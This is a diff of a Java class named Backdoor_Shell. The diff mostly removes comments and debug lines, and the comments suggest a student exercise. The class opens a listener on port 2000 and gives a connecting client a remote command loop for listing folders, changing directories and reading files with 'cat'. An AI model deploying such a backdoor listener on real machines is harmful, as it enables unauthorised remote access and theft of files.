@@ -11,9 +11,7 @@ import java.util.stream.Stream;
 public class Backdoor_Shell {
 	public static void main(String[] args) throws FileNotFoundException {
 		
-		//HOW DO I GET FOLDERS INTO THIS ECLIPSE FILE?
 
-		
 		try {
 			ServerSocket server=new ServerSocket(2000);
 			Socket client=server.accept();
@@ -95,19 +93,19 @@ public class Backdoor_Shell {
 						writer.write("\n\r");
 	
 						
-						//THIS JUST LIST THE NAMES OF THE FILES INSIDE OF THE ECLIPSE
+						
 						
 					}
 					writer.write("\n\rAmount of content in this folder: " + am +"\n");
 						
-				//	listFiles(workingDir,toBeginning,server,client,reader,writer,wrkDir,toBeg);
+				
 					
 					
 				}
-				else if(cmd[0].equalsIgnoreCase("cd")) //PRINTS THE PROMPTS AFTER YOU ALREADY TYPED IT IN
+				else if(cmd[0].equalsIgnoreCase("cd")) 
 				{
 		
-				//	String[] Split = clientCommand.split(" ");
+				
 					
 					File tempWrkDir;
 
@@ -118,10 +116,10 @@ public class Backdoor_Shell {
 								
 								workingDir = workingDir;
 								
-								//System.out.println("Check 1");
+								
 						
 							}
-							else if (cmd[1].equalsIgnoreCase(".."))//I DON'T KNOW WHAT TO DO HERE
+							else if (cmd[1].equalsIgnoreCase(".."))
 							{
 						
 								tempWrkDir = new File(workingDir).getParentFile();
@@ -160,38 +158,7 @@ public class Backdoor_Shell {
 								}
 							
 								
-//								for (String d: Split)
-//								{
-//									if(!d.contains("cd"))
-//									{
-//										
-//										File directt = new File("C:\\"+d+"\\");
-//										
-//										wrkDir = directt;
-//									
-//										
-//										if(wrkDir.isDirectory()&&prevDir.isDirectory())
-//										{
-//											workingDir = d;
-//											
-//				
-//											
-//											System.out.println("Check 4");
-//							
-//												//STILL CONTINUES EVEN THOUGH ITS NOT A DIRECTORY
-//												//HAS BEEN FIXED
-//										}
-//										else if(!wrkDir.isDirectory())
-//										{
-//											writer.write(d + " does not exists\n");
-//										}
-//									}
-//										
-//									}
-//	
-//								}
-					
-					//currentDir(workingDir,toBeginning,clientCommand,server,client,reader,writer,wrkDir,toBeg);
+
 					
 					
 				}
@@ -199,24 +166,13 @@ public class Backdoor_Shell {
 					
 					
 
-				else if(clientCommand.contains("cat"))//PRINTS THE PROMPTS AFTER YOU ALREADY TYPED IT IN
+				else if(clientCommand.contains("cat"))
 				{
-					
-					
-							
+				
 					readingFiles(workingDir,cmd,reader,writer);
 							
-						}
-					//}
-					
-					
-					
-					
-					
-					//CLOSES CONNECTION AFTER USING CAT
-					
-					
-			//	}
+				}
+								
 				else if(clientCommand.equalsIgnoreCase("]"))
 				{
 					System.exit(0);
@@ -274,7 +230,7 @@ public class Backdoor_Shell {
 					}
 				else if(!fil.isFile())
 						{
-						//writer.write("\n\r");
+						
 						writer.write("File "+spi +" not found!\n"); 
 						}
 		
